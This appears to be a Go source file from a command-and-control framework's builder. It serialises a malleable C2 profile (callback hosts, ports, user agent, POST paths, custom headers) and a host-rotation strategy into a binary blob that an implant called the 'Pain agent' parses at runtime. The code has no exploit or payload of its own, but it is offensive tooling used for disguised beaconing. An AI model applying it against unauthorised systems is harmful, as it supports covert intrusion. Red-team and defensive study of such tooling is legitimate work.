package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
)

type profJSON struct {
	Callbacks []profCallback `json:"callbacks"`
}

type profCallback struct {
	Hosts     []string        `json:"hosts"`
	UserAgent string          `json:"user_agent"`
	Post      *profHTTPMethod `json:"post"`
}

type profHTTPMethod struct {
	URI           map[string]json.RawMessage `json:"uri"`
	ClientHeaders map[string]string          `json:"client_headers"`
}

// buildMalleableBytes serialises the C2 profile JSON + rotation strategy into a compact
// binary blob that the Pain agent parses at runtime (Malleable_Init in Malleable.cc).
//
// Wire format (count and rotation are stored separately in g_CallbackCount / g_RotationStrategy):
//
//	per callback entry:
//	  [4 LE] host_len  + host bytes (ASCII, no null terminator)
//	  [2 LE] port
//	  [1]    ssl (0 or 1)
//	  [4 LE] ua_len    + user_agent bytes (ASCII)
//	  [4 LE] uri_len   + uri bytes (ASCII, first POST path from the profile)
func buildMalleableBytes(profileContent string, strategy string, ssl bool) ([]byte, int, error) {
	var profile profJSON
	if err := json.Unmarshal([]byte(profileContent), &profile); err != nil {
		return nil, 0, fmt.Errorf("profile JSON parse: %w", err)
	}

	type entry struct {
		host    string
		port    uint16
		ssl     bool
		ua      string
		uri     string
		headers map[string]string
	}
	var entries []entry

	for _, cb := range profile.Callbacks {
		// Pick the first POST URI path from the profile; default to "/".
		postURI := "/"
		var postHeaders map[string]string
		if cb.Post != nil {
			for path := range cb.Post.URI {
				parts := strings.Fields(path)
				if len(parts) > 0 {
					postURI = parts[0]
				}
				break
			}
			postHeaders = cb.Post.ClientHeaders
		}

		ua := cb.UserAgent
		if ua == "" {
			ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
		}

		for _, hp := range cb.Hosts {
			host, portStr, found := strings.Cut(hp, ":")
			port := uint16(443)
			if found {
				if p, err := strconv.Atoi(portStr); err == nil && p > 0 && p < 65536 {
					port = uint16(p)
				}
			}
			entries = append(entries, entry{
				host:    host,
				port:    port,
				ssl:     ssl,
				ua:      ua,
				uri:     postURI,
				headers: postHeaders,
			})
		}
	}

	if len(entries) == 0 {
		return nil, 0, fmt.Errorf("no callback entries found in profile")
	}

	var buf bytes.Buffer

	writeU32 := func(v uint32) {
		var b [4]byte
		binary.LittleEndian.PutUint32(b[:], v)
		buf.Write(b[:])
	}
	writeU16 := func(v uint16) {
		var b [2]byte
		binary.LittleEndian.PutUint16(b[:], v)
		buf.Write(b[:])
	}
	writeStr := func(s string) {
		writeU32(uint32(len(s)))
		buf.WriteString(s)
	}

	for _, e := range entries {
		writeStr(e.host)
		writeU16(e.port)
		if e.ssl {
			buf.WriteByte(1)
		} else {
			buf.WriteByte(0)
		}
		writeStr(e.ua)
		writeStr(e.uri)
		// Custom request headers: [2 LE count] { [4 LE name_len][name][4 LE val_len][val] }
		writeU16(uint16(len(e.headers)))
		for name, val := range e.headers {
			writeStr(name)
			writeStr(val)
		}
	}

	return buf.Bytes(), len(entries), nil
}

// rotationCode converts the UI strategy string to a numeric code the C agent uses:
// 0 = round-robin, 1 = random, 2 = failover.
func rotationCode(strategy string) int {
	switch strings.ToLower(strings.TrimSpace(strategy)) {
	case "random":
		return 1
	case "failover":
		return 2
	default:
		return 0 // round-robin (also covers "Round Robin" and "")
	}
}

// bytesToHexStr converts a byte slice to a C array literal, e.g. {0x01,0x02,0x03}.
func bytesToHexStr(b []byte) string {
	if len(b) == 0 {
		return "{0x00}"
	}
	var sb strings.Builder
	sb.WriteByte('{')
	for i, v := range b {
		if i > 0 {
			sb.WriteByte(',')
		}
		sb.WriteString(fmt.Sprintf("0x%02x", v))
	}
	sb.WriteByte('}')
	return sb.String()
}
